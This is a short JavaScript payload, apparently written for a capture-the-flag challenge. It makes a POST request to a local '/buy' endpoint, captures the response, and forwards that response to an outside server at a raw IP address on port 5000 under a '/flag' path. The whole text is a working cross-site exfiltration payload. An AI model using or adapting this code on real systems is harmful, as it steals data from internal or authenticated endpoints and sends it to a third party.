fetch("http://localhost/buy", {
        method: "POST",
        body: "id=0",
    })
    .then((response) => { return response.text(); })
    .then((data) => {
        fetch("http://120.26.219.126:5000/flag", {
            method: "POST",
            body: data,
        })
    })   .catch((error) => {
        console.error("Error:", error);
    });
